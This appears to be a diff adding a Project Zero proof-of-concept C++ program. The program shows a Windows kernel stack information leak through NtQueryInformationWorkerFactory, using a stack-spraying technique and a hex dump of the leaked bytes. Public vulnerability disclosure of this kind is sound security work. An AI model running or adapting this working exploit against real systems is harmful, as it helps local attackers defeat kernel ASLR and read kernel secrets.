@@ -1,0 +1,144 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1214&desc=2
+
+We have discovered that the nt!NtQueryInformationWorkerFactory system call called with the WorkerFactoryBasicInformation (7) information class discloses portions of uninitialized kernel stack memory to user-mode clients, on Windows 7 to Windows 10.
+
+The specific layout of the output structure corresponding to the class is unknown to us; however, we have determined that on 32-bit Windows platforms, an output size of 96 bytes is accepted. Within that memory area, 5 uninitialized bytes from the kernel stack can be leaked to the client application.
+
+The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call with infoclass=WorkerFactoryBasicInformation and the allowed output size. An example output is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 44 5f 9a fe ff ff ff 00 00 00 01 00 00 00 41 .D_............A
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 14 0a 00 00 00 00 01 00 00 10 00 00 00 00 00 00 ................
+--- cut ---
+
+It is clearly visible here that among all data copied from ring-0 to ring-3, 1 byte at offset 0x1f and 4 bytes at offset 0x3c remained uninitialized. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+extern "C" {
+
+ULONG WINAPI NtMapUserPhysicalPages(
+    PVOID BaseAddress,
+    ULONG NumberOfPages,
+    PULONG PageFrameNumbers
+);
+
+NTSTATUS WINAPI
+NtCreateWorkerFactory(
+    _Out_ PHANDLE WorkerFactoryHandleReturn,
+    _In_ ACCESS_MASK DesiredAccess,
+    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+    _In_ HANDLE CompletionPortHandle,
+    _In_ HANDLE WorkerProcessHandle,
+    _In_ PVOID StartRoutine,
+    _In_opt_ PVOID StartParameter,
+    _In_opt_ ULONG MaxThreadCount,
+    _In_opt_ SIZE_T StackReserve,
+    _In_opt_ SIZE_T StackCommit
+);
+
+NTSTATUS WINAPI
+NtQueryInformationWorkerFactory(
+    _In_ HANDLE WorkerFactoryHandle,
+    _In_ ULONG WorkerFactoryInformationClass,
+    _Out_writes_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
+    _In_ ULONG WorkerFactoryInformationLength,
+    _Out_opt_ PULONG ReturnLength
+);
+
+}  // extern "C"
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[4096];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, sizeof(buffer) / sizeof(DWORD), (PULONG)buffer);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Create a completion port.
+  HANDLE hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
+  if (hCompletionPort == NULL) {
+    printf("CreateIoCompletionPort failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  // Create the worker factory object to query.
+  HANDLE hWorkerFactory = NULL;
+  NTSTATUS st = NtCreateWorkerFactory(&hWorkerFactory, GENERIC_ALL, NULL, hCompletionPort, GetCurrentProcess(), NULL, NULL, 0, 0, 0);
+  if (!NT_SUCCESS(st)) {
+    printf("NtCreateWorkerFactory failed, %x\n", st);
+    CloseHandle(hCompletionPort);
+    return 1;
+  }
+
+  // Spray the kernel stack to get visible results.
+  SprayKernelStack();
+
+  // Trigger the vulnerability and print out the output structure.
+  BYTE output[96] = { /* zero padding */ };
+  DWORD ReturnLength;
+
+#define WorkerFactoryBasicInformation 7
+  st = NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, output, sizeof(output), &ReturnLength);
+
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationWorkerFactory failed, %x\n", st);
+    CloseHandle(hWorkerFactory);
+    CloseHandle(hCompletionPort);
+    return 1;
+  }
+
+  PrintHex(output, ReturnLength);
+
+  // Free resources.
+  CloseHandle(hWorkerFactory);
+  CloseHandle(hCompletionPort);
+
+  return 0;
+}
